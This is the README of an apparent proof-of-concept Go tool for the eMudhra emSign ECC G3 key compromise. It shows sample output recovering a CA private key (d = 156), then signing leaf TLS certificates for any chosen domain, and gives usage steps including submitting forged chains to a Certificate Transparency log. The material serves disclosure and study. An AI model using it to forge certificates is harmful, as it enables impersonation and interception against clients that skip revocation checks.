# emudhra-poc

Proof of concept for the eMudhra emSign ECC G3 intermediate key compromise
([Mozilla bug 2083449](https://bugzilla.mozilla.org/show_bug.cgi?id=2083449)).
The CA private keys are tiny integers, so they can be recovered from the
public CA certificates and used to sign arbitrary leaf certificates.
All affected intermediates are revoked (caCompromise).

The tool recovers the CA key from the CA certificate, issues a leaf
certificate (OU `PoC`, max. 7 days validity) and verifies the result.

```
$ ./emudhra-poc
Issuing CA
  Subject:        CN=EM DV TLS CA - G3B,O=eMudhra BV,C=NL
  Issuer:         CN=AAA Certificate Services,O=Comodo CA Limited,L=Salford,ST=Greater Manchester,C=GB
  Serial:         a024fdf4ba665c785ce4a020483858b7
  Not before:     2025-05-14T00:00:00Z
  Not after:      2028-12-31T23:59:59Z
  Public key:     ECDSA P-384
  Signature alg:  SHA256-RSA
  CA:             true
  Key usage:      keyCertSign, cRLSign
  Ext key usage:  serverAuth, clientAuth
  Policy:         2.23.140.1.2.1
  Policy:         1.3.6.1.4.1.50977.1.0.1
  Policy:         1.3.6.1.4.1.50977.1.2.100
  Subject key ID: e21e2fe71c19390e554b62c120245735248a2514
  Auth key ID:    a0110a233e96f107ece2af29ef82a57fd030a4b4
  CRL:            http://crl.comodoca.com/AAACertificateServices.crl
  OCSP:           http://ocsp.comodoca.com
  SHA-256:        45A883F349AEDFD5F3A649B5498FFB121712BA8B448F3F2A91DBC5A766FCDDBE
  Recovered key:  d = 156

Leaf certificate
  Subject:        CN=we-are-lost.com,OU=PoC,O=eMudhra key lol
  Issuer:         CN=EM DV TLS CA - G3B,O=eMudhra BV,C=NL
  Serial:         78000bc1120525dbb77c0521d48d01bb
  Not before:     2026-10-20T23:42:34Z
  Not after:      2026-10-21T23:47:34Z
  Public key:     ECDSA P-256
  Signature alg:  ECDSA-SHA384
  CA:             false
  Key usage:      digitalSignature
  Ext key usage:  serverAuth
  SANs:           DNS:we-are-lost.com
  Auth key ID:    e21e2fe71c19390e554b62c120245735248a2514
  SHA-256:        FF9D066B8837C7BD7D4FA4E1EE4009DDEC59FD4FF60FA2DD3E79373C49598683

Checks
  [ OK ] leaf signature verifies under CA public key
  [ OK ] leaf certificate matches generated leaf key
  [ OK ] leaf authority key ID matches CA subject key ID
  [ OK ] chain verification against CA certificate (intermediate used as trust anchor, offline)
         chain: we-are-lost.com -> EM DV TLS CA - G3B
  [INFO] Go x509.Verify rejects the chain: x509: no valid chains built

Output
  cert:  out/leaf.pem
  key:   out/leaf.key
  chain: out/chain.pem

Note: the issuing CA was revoked with reason caCompromise; revocation-checking clients should reject this chain.
```

The `[INFO]` line reflects Go 1.26.10 / 1.27.3 and later, which distrust the
compromised eMudhra keys in `x509.Verify`; the tool verifies the chain itself
instead. Older Go versions print `[INFO] Go x509.Verify accepts the chain`.

## Usage

```
go build -o emudhra-poc ./src
cp config.example.json config.json   # set ca_cert to one of the CA PEMs
./emudhra-poc                        # issue, write files, print details and checks
```

| Flag          | Description                                                     |
|---------------|-----------------------------------------------------------------|
| `-config`     | Path to the JSON config (default `config.json`)                 |
| `-san`        | SANs, repeatable or comma-separated; replaces config SANs       |
| `-show`       | Print only the certificate PEM; no files, no checks             |
| `-chain`      | Also print the complete chain (leaf, CA, root) as PEM           |
| `-json`       | Print only the chain as a CT `add-chain` JSON request           |

SAN types are inferred or set with a prefix: `DNS:`, `IP:`, `email:`, `URI:`.

```
./emudhra-poc -show -san poc.example,IP:192.0.2.1
./emudhra-poc -show -json -san poc.example \
  | curl -sS -H 'Content-Type: application/json' --data-binary @- https://<log>/ct/v1/add-chain
```

## Layout

All Go code lives in `src/` (package `main`); `go.mod`, the example config
and the CA certificates in `keys/` stay in the repository root.

```
go test ./...
```

## References

- https://github.com/Fluepke/emudrahahahahaha
- https://github.com/galadran/we-have-a-problem.com
- https://emudhra.we-have-a-problem.com/
